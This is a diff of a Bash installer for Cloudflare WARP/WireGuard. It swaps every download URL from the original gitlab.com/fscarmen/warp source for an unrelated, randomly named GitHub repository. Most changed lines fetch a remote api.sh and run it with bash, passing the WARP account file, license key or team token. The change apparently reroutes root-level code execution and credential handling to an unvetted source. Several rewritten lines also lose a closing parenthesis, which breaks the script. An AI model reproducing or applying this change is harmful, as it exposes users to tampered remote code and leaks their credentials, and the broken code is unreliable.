@@ -446,7 +446,7 @@ check_root_virt() {
 check_cdn() {
   RANDOM_CDN=($(shuf -e "${CDN_URL[@]}"))
   for CDN in "${RANDOM_CDN[@]}"; do
-    wget -T2 -qO- https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh | grep -q '#!/usr/bin/env' && break || unset CDN
+    wget -T2 -qO- https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | grep -q '#!/usr/bin/env' && break || unset CDN
   done
 }
 
@@ -519,7 +519,7 @@ check_dependencies() {
 cancel_account(){
   local FILE=$1
   if [ -s "$FILE" ]; then
-    grep -oqE '"id":[ ]+"t.[A-F0-9a-f]{8}-' $FILE || bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --cancle --file $FILE >/dev/null 2>&1
+    grep -oqE '"id":[ ]+"t.[A-F0-9a-f]{8}-' $FILE || bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --cancle --file $FILE >/dev/null 2>&1
   fi
 }
 
@@ -836,11 +836,11 @@ change_ip() {
       wg-quick down warp >/dev/null 2>&1
       [ -s /etc/wireguard/info.log ] && grep -q 'Device name' /etc/wireguard/info.log && local LICENSE=$(cat /etc/wireguard/license) && local NAME=$(awk '/Device name/{print $NF}' /etc/wireguard/info.log)
       cancel_account /etc/wireguard/warp-account.conf
-      bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
+      bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh| sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
       # 如原来是 plus 账户，以相同的 license 升级，并修改账户和 warp 配置文件
       if [[ -n "$LICENSE" && -n "$NAME" ]]; then
-        [ -n "$LICENSE" ] && bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE >/dev/null 2>&1
-        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+        [ -n "$LICENSE" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --license $LICENSE >/dev/null 2>&1
+        [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
         local PRIVATEKEY="$(grep 'private_key' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
         local ADDRESS6="$(grep '"v6.*"$' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
         local CLIENT_ID="$(reserved_and_clientid /etc/wireguard/warp-account.conf file)"
@@ -1154,7 +1154,7 @@ uninstall() {
 # 同步脚本至最新版本
 ver() {
   mkdir -p /tmp; rm -f /tmp/menu.sh
-  wget -O /tmp/menu.sh https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/menu.sh
+  wget -O /tmp/menu.sh https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/menu.sh
   if [ -s /tmp/menu.sh ]; then
     mv /tmp/menu.sh /etc/wireguard/
     chmod +x /etc/wireguard/menu.sh
@@ -1583,7 +1583,7 @@ input_url_token() {
       [ -z "$TEAM_TOKEN" ] && return
 
       unset TEAMS ADDRESS6 PRIVATEKEY CLIENT_ID
-      TEAMS=$(bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's# > $registe_path##; /cat $registe_path/d') --registe --token $TEAM_TOKEN)
+      TEAMS=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's# > $registe_path##; /cat $registe_path/d') --registe --token $TEAM_TOKEN)
       ADDRESS6=$(expr "$TEAMS" : '.*"v6":[ ]*"\([^"]*\).*')
       PRIVATEKEY=$(expr "$TEAMS" : '.*"private_key":[ ]*"\([^"]*\).*')
       RESERVED=$(expr "$TEAMS" : '.*"client_id":[ ]*"\([^"]*\).*')
@@ -1833,7 +1833,7 @@ best_mtu() {
 # 寻找最佳 Endpoint，根据 v4 / v6 情况下载 endpoint 库
 best_endpoint() {
   wget $STACK -qO /tmp/endpoint https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/endpoint/warp-linux-"$ARCHITECTURE" && chmod +x /tmp/endpoint
-  [ "$IPV4$IPV6" = 01 ] && wget $STACK -qO /tmp/ip https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/endpoint/ipv6 || wget $STACK -qO /tmp/ip https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/endpoint/ipv4
+  [ "$IPV4$IPV6" = 01 ] && wget $STACK -qO /tmp/ip https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/ipv6 || wget $STACK -qO /tmp/ip https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/ipv4
 
   if [[ -e /tmp/endpoint && -e /tmp/ip ]]; then
     /tmp/endpoint -file /tmp/ip -output /tmp/endpoint_result >/dev/null 2>&1
@@ -1981,9 +1981,9 @@ EOF
       [ -s /etc/wireguard/warp-account.conf ] && warning "\n $(text 107) \n"
     elif [ -n "$LICENSE" ]; then
       if [ -s /etc/wireguard/warp-account.conf ]; then
-        local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
+        local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --license $LICENSE)
         if grep -q '"warp_plus": true' <<< "$UPDATE_RESULT"; then
-          [ -n "$NAME" ] && bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+          [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
           sed -i "s#\([ ]\+\"license\": \"\).*#\1$LICENSE\"#g; s#\"account_type\".*#\"account_type\": \"limited\",#g; s#\([ ]\+\"name\": \"\).*#\1$NAME\"#g" /etc/wireguard/warp-account.conf
           echo "$LICENSE" > /etc/wireguard/license
           echo -e "Device name   : $NAME" > /etc/wireguard/info.log
@@ -2501,7 +2501,7 @@ check_quota() {
   if [ "$CHECK_TYPE" = 'client' ]; then
     QUOTA=$(warp-cli --accept-tos account 2>/dev/null | awk -F' ' '/Quota/{print $NF}')
   elif [ -e /etc/wireguard/warp-account.conf ]; then
-    QUOTA=$(bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --device | awk '/quota/{print $NF}' | sed "s#,##")
+    QUOTA=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --device | awk '/quota/{print $NF}' | sed "s#,##")
   fi
 
   # 部分系统没有依赖 bc，所以两个小数不能用 $(echo "scale=2; $QUOTA/1000000000000000" | bc)，改为从右往左数字符数的方法
@@ -2621,7 +2621,7 @@ change_to_free() {
     esac
 
     # 流程3:注册新账户
-    bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
+    bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
 
     # 流程4:如成功，根据新账户信息修改配置文件并注销旧账户; 如失败则还原为原账户
     # 如升级成功的处理: 删除原账户信息文件，注销原账户
@@ -2736,15 +2736,15 @@ change_to_plus() {
     esac
 
     # 流程3:注册新账户
-    bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
+    bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh | sed 's#cat $registe_path; ##') --registe --file /etc/wireguard/warp-account.conf 2>/dev/null
 
     # 流程4:使用 License 升级账户
-    local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --license $LICENSE)
+    local UPDATE_RESULT=$(bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --license $LICENSE)
 
     # 流程5:如成功，根据新账户信息修改配置文件并注销旧账户; 如失败则还原为原账户
     # 如升级成功的处理: 删除原账户信息文件，注销原账户
     if grep -q '"warp_plus": true' <<< "$UPDATE_RESULT"; then
-      [ -n "$NAME" ] && bash <(curl -m5 -sSL https://${CDN}gitlab.com/fscarmen/warp/-/raw/main/api.sh) --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
+      [ -n "$NAME" ] && bash <(curl -m5 -sSL https://raw.githubusercontent.com/MHCloner/rhazefafewa/main/api.sh --file /etc/wireguard/warp-account.conf --name $NAME >/dev/null 2>&1
       cancel_account /etc/wireguard/warp-account.conf.bak
       backup_restore_delete delete
       local PRIVATEKEY="$(grep 'private_key' /etc/wireguard/warp-account.conf | cut -d\" -f4)"
